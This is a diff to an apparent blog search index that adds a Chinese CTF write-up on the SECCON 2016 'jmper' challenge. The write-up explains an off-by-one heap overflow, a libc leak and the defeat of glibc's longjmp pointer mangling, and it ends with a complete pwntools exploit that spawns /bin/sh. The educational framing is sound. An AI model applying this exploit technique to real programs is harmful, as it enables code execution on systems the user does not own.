@@ -3,6 +3,84 @@
   
     
     <entry>
+      <title><![CDATA[Pwn With longjmp]]></title>
+      <url>/2018/03/20/pwn_with_longjmp.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个是 <code>seccon-ctf-quals-2016</code> 的一个题，利用方式还是挺特殊的记录一下。</p>
+<p>题目链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://t.cn/RnfeHLv</div></pre></td></tr></table></figure></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先看看程序的安全措施</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~/workplace/jmper$ checksec jmper </div><div class="line">[*] &apos;/home/haclh/workplace/jmper/jmper&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Full RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div></pre></td></tr></table></figure>
+<p>开了 <code>Full RELRO</code>, 所以不能修改 <code>got</code> 表了。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15215382002025x4tlsc6.png?imageslim" alt="paste image"></p>
+<p>分配了两个大内存，一个作为一个全局表，用于存放程序中用的结构体指针, 一个作为 <code>jmpbuf</code>, 用于在 <code>longjmp</code> 时跳转回来。</p>
+<p>接下来就是 <code>f</code> 函数，程序主要的逻辑在这里面。</p>
+<p><strong> Add student</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521538397189oa86q6ce.png?imageslim" alt="paste image"></p>
+<p>最多的可以创建 <code>0x1d</code> 个 <code>student</code>, 如果已经创建满了的话就 <code>longjmp</code> 返回到 <code>main</code> 函数结束程序。创建时会分配两个堆内存。<br>结构体类型大概为</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521539124150snch2clv.png?imageslim" alt="paste image"></p>
+<p>分配第一个 <code>student</code> 时的 内存布局为</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521539070005wne46ifn.png?imageslim" alt="paste image"></p>
+<p><strong> Name student</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521539250683ge2twokg.png?imageslim" alt="paste image"></p>
+<p>输入 <code>id</code>, 然后在 <code>myclass</code> 里面找到相应的地址，取出 <code>name_ptr</code> ，向里面写入内容，注意循环条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">for ( i = 0; i &lt;= 0x20; ++i )</div></pre></td></tr></table></figure>
+<p>我们可以写入 <code>0x21</code> 个字节，我们分配的内存为 <code>0x20</code>, 可以有 一字节的 溢出，不过这里我们不能控制 分配的大小以及 释放堆块， 无法使用 <code>overlap-heap</code> 利用。继续往下看。</p>
+<p><strong>Write memo</strong></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521539504541i7pd30sf.png?imageslim" alt="paste image"></p>
+<p>类似的操作，依旧可以溢出 <code>memo</code> 的 一个字节， 在 <code>memo</code> 后面存放的是 <code>name_ptr</code> 所以我们可以修改 <code>name_ptr</code> 的最低字节.</p>
+<p>有一个小知识，如果内存分配的顺序大小不变，各个内存块相对于堆基地址的偏移是固定的，所以修改 <code>name_ptr</code> 的最低字节，我们可以使得 <code>name_ptr</code> 指向和 它距离较近的堆块。</p>
+<p>这里的话直接修改为下一个堆块的 <code>name_ptr</code> 的地址， 然后利用 <code>name student</code> 就可以修改下一个堆块的 <code>name_ptr</code>，再利用后面的  <code>Show Name</code> 功能就可以实现 任意地址读写。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521546298793dsio5knx.png?imageslim" alt="paste image"></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521546412894whwkadvs.png?imageslim" alt="paste image"></p>
+<p>以后通过 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">set_name(0, p64(addr))  </div><div class="line">getname(1)</div></pre></td></tr></table></figure>
+<p>就可以实现任意地址读</p>
+<p>通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">set_name(0, p64(addr))  </div><div class="line">set_name(1, data)</div></pre></td></tr></table></figure></p>
+<p>就可以实现任意地址写</p>
+<p>现在的问题是往哪写，写什么。</p>
+<p>当新增的<code>student</code>的人数到限制后，会调用<code>longjmp</code>， 我们来看看 调用 <code>longjmp</code> 时做了什么</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521546663323b4hmpgt1.png?imageslim" alt="paste image"></p>
+<p>进入函数时 <code>rdi</code> 为 <code>jmpbuf</code>  的地址，可以看到，在 <code>jmpbuf + 0x38</code> 处存放了加密后的 <code>rip</code>, 进入 <code>longjmp</code>会先解密 出 <code>rip</code> 然后跳转。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov     rdx, [rdi+38h]</div><div class="line">ror     rdx, 11h</div><div class="line">xor     rdx, fs:30h</div></pre></td></tr></table></figure>
+<p><code>jmpbuf</code> 在堆中，如果我们可以 拿到 <code>fs:30h</code> 然后修改 <code>jmpbuf + 0x38</code> ，我们就可以控制执行流了。</p>
+<p><code>longjmp</code> 跳转的地址其实就是 调用 <code>setjmp</code> 的下一条指令（<strong>0x400C31</strong>）</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521547234363vdprnnu9.png?imageslim" alt="paste image"></p>
+<p>又由于 <code>xor</code> 是可逆的，所以我们可以通过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov     rdx, [rdi+38h]</div><div class="line">ror     rdx, 11h</div><div class="line">xor     rdx, 0x400C31</div></pre></td></tr></table></figure>
+<p>得到 <code>fs:30h</code> </p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521547217267fo2ja7uv.png?imageslim" alt="paste image"></p>
+<p>至于重新的加密 <code>rip</code> 的过程，可以看 <code>setjmp</code> 的实现</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521547361414hqi1my3w.png?imageslim" alt="paste image"></p>
+<p>所以总的利用思路</p>
+<ul>
+<li>利用 <code>off-by-one</code> 获取任意地址读写的能力</li>
+<li>利用 <code>student 2</code> 的 <code>name_ptr</code> 泄露堆地址</li>
+<li>获取  <code>jmpbuf + 0x38</code> 的值，计算  <code>fs:30h</code>的值</li>
+<li>重新计算值写入  <code>jmpbuf + 0x38</code> ， 同时往 <code>jmpbuf</code>开头写入 ``/bin/sh\x00</li>
+</ul>
+<p><strong>参考</strong></p>
+<p><a href="https://github.com/ctfs/write-ups-2016/tree/master/seccon-ctf-quals-2016/exploit/cheer-msg-100" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016/tree/master/seccon-ctf-quals-2016/exploit/cheer-msg-100</a></p>
+<p>最后的 exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div></pre></td><td class="code"><pre><div class="line">#/usr/bin/env python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line"># context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</div><div class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;info&apos;)</div><div class="line">p = process(&quot;./jmper&quot;)</div><div class="line"></div><div class="line"></div><div class="line">def ror(reg, count):</div><div class="line">    src = bin(reg)[2:]</div><div class="line">    src = &quot;0&quot; * (64 - len(src)) + src</div><div class="line">    # print(src)</div><div class="line">    # print(src[-count:] + &quot;:::&quot; + src[:64 - count])</div><div class="line">    return int(src[-count:] + src[:64 - count],2)</div><div class="line"></div><div class="line">def rol(reg, count):</div><div class="line">    src = bin(reg)[2:]</div><div class="line">    src = &quot;0&quot; * (64 - len(src)) + src</div><div class="line">    # print(src)</div><div class="line">    # print(src[:count] + &quot;:::&quot; + src[count:])</div><div class="line">    # print(src[count:] + src[:count])</div><div class="line">    return int(src[count:] + src[:count],2)</div><div class="line"></div><div class="line">def add():</div><div class="line">  p.recvuntil(&quot;Bye :)&quot;)</div><div class="line">  p.sendline(&quot;1&quot;)</div><div class="line"></div><div class="line">def set_name(index, name):</div><div class="line">  p.recvuntil(&quot;Bye :)&quot;)</div><div class="line">  p.sendline(&quot;2&quot;)</div><div class="line">  p.recvuntil(&quot;ID:&quot;)</div><div class="line">  p.sendline(str(index))</div><div class="line">  p.recvuntil(&quot;Input name:&quot;)</div><div class="line">  p.sendline(name)</div><div class="line"></div><div class="line">def write_memo(index, data):</div><div class="line">  p.recvuntil(&quot;Bye :)&quot;)</div><div class="line">  p.sendline(&quot;3&quot;)</div><div class="line">  p.recvuntil(&quot;ID:&quot;)</div><div class="line">  p.sendline(str(index))</div><div class="line">  p.recvuntil(&quot;Input memo:&quot;)</div><div class="line">  p.sendline(data)</div><div class="line"></div><div class="line"></div><div class="line">def getname(index):</div><div class="line">  p.recvuntil(&quot;Bye :)&quot;)</div><div class="line">  p.sendline(&quot;4&quot;)</div><div class="line">  p.recvuntil(&quot;ID:&quot;)</div><div class="line">  p.sendline(str(index))</div><div class="line"></div><div class="line">gdb.attach(p,&apos;&apos;&apos;</div><div class="line"># bp 0x0400B03</div><div class="line"># bp __sigsetjmp</div><div class="line">c</div><div class="line">  &apos;&apos;&apos;)</div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">add()  # get stu 0</div><div class="line">set_name(0, &quot;/bin/sh\x00&quot;)</div><div class="line">write_memo(0, &quot;b&quot;*8)</div><div class="line"></div><div class="line"></div><div class="line">add()  # get stu 1</div><div class="line">set_name(1, &quot;c&quot;*8)</div><div class="line">write_memo(1, &quot;d&quot;*8)</div><div class="line"></div><div class="line"></div><div class="line">write_memo(0, &quot;b&quot;*32 + &quot;\x78&quot;)  # 设置 student0 的 name_ptr 指向 student1 的 name_ptr 的位置</div><div class="line">log.info(&quot;此时 0&apos;s name_ptr--&gt; 1&apos;s name_ptr的地址&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line">getname(0)</div><div class="line">heap = u64(p.recv(3) + &quot;\x00&quot; * 5) - 656</div><div class="line">log.info(&quot;heap的基地址： &quot; + hex(heap))</div><div class="line">pause()</div><div class="line"></div><div class="line">set_name(0, p64(0x0601FA8+1))   </div><div class="line">log.info(&quot;1&apos;s name_ptr ---&gt; printf@got+1&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line">getname(1)</div><div class="line">printf_addr = u64(&quot;\x00&quot; + p.recv(5) + &quot;\x00&quot; * 2)</div><div class="line">libc = printf_addr - 350208</div><div class="line">system = libc + 283536</div><div class="line">longjmp = libc + 0x352F0</div><div class="line"></div><div class="line"></div><div class="line">log.info(&quot;libc: &quot; + hex(libc))</div><div class="line">log.info(&quot;system: &quot; + hex(system))</div><div class="line">log.info(&quot;longjmp: &quot; + hex(longjmp))</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">jmpbuf = heap + 0x110</div><div class="line">saved_rip_addr = jmpbuf + 0x38</div><div class="line"></div><div class="line"></div><div class="line"># 获取 saved_rip_addr 处的数据</div><div class="line">set_name(0, p64(saved_rip_addr))  </div><div class="line">getname(1)</div><div class="line">saved_rip = u64(p.recv(8))</div><div class="line">xor_key = ror(saved_rip, 0x11) ^ 0x400C31</div><div class="line"></div><div class="line">new_saved_rip = rol(system ^ xor_key, 0x11) </div><div class="line"></div><div class="line">log.info(&quot;saved_rip: &quot; + hex(saved_rip))</div><div class="line">log.info(&quot;xor_key: &quot; + hex(xor_key))</div><div class="line">log.info(&quot;new saved_rip： &quot; + hex(new_saved_rip) )</div><div class="line">pause()</div><div class="line"></div><div class="line">set_name(1,p64(new_saved_rip))</div><div class="line"></div><div class="line">set_name(0, p64(jmpbuf))  </div><div class="line">set_name(1,&quot;/bin/sh\x00&quot;)</div><div class="line"></div><div class="line">log.info(&quot;set jmpbuf: /bin/sh\x00.....&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">for x in xrange(0x1e - 2):</div><div class="line">  add()</div><div class="line"></div><div class="line">log.info(&quot;call longjmp&quot;)</div><div class="line">pause()</div><div class="line">add()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+]]></content>
+      
+        <categories>
+            
+            <category> ctf </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> off-by-one </tag>
+            
+            <tag> longjmp to shell </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[命令注入漏洞总结]]></title>
       <url>/2018/03/17/command_inject.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>漏洞本身原理很简单，用户的输入作为 要执行命令的一部分被 一些执行系统命令的函数去执行，如果不注意就能够让攻击者执行系统命令。</p>
